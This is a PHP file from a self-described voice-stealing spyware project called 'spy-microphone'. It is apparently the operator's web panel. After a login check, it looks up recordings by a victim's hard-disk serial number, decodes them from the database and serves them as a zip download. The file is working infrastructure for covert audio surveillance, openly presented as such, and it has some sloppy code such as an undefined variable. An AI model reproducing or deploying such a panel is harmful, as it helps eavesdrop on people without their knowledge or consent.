<?php

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# spy-microphone is a program for steal voice in gnu/linux OS.
#
# spy-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# spy-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#

session_start();

 if (!isset($_SESSION['login']))
    {
      header("Location: index.php");
      }


   else
    {


 if (isset($_POST['backup_records_hard_disk'])) 
     {


 require_once('__ROOT__/connect.php');


            if (class_exists('DATABASE_CONNECT'))
            {
 
             $obj_conn  = new DATABASE_CONNECT;
            
             $host = $obj_conn->connect[0];
             $user = $obj_conn->connect[1];
             $pass = $obj_conn->connect[2];
             $db   = $obj_conn->connect[3];
 
            $conn = new mysqli($host,$user,$pass,$db);
 
             if ($conn->connect_error)
                   {
                    die ("Cannot connect " .$conn->connect_error);
                    }

               else
                {

                $backup_records_hard_disk = $conn->real_escape_string($_POST['backup_records_hard_disk']);

                $sql= " SELECT instant, record FROM records 
                        WHERE hard_disk_id_serial_number = '$backup_records_hard_disk'";
                $result = $conn->query($sql);

          if ($result) 
                 {
         
              if ($result->num_rows > 0)
                  {
               
                while ($row = $result->fetch_assoc())
                  {
                //ziparontas ta arxeia
               
                $zip = new ZipArchive();
                $filename = "$user_login" ."_" .date('Y.m.d H.i.s') .".zip";
                if ($zip->open($filename, ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE) !== true) 
                    {
                    echo "Cannot Open for writing";
                    } 
                $array_name[] = $row["instant"];
                $array_data[] = base64_decode($row["record"]);  
                
                
              foreach(array_combine($array_name, $array_data) as $file_name => $file_data) 
                  {  
                $ext = $file_name; 
                $zip->addFromString($ext, $file_data); 
                     }
                //$ext = $row['name']; // taking file name from DB and adding extension separately
               // $zip->addFromString($ext, $row['data']); //adding blob data from DB
                $zip->close();
                   
             header("Content-disposition: inline; filename=$filename");
             //header("Content-Length: ". $row['size']);
            header('Content-type: application/zip');
            readfile($filename);
            unlink($filename);
            
              } // end of while
             } // end of num rows
           } // end of result
    // Free the mysqli resources     
         //$result->free_result();
         $conn->close();
   
 


   }// end else of connect


  }// end if exists connect


 } // end if isset post

 
 } // else of session login


?>
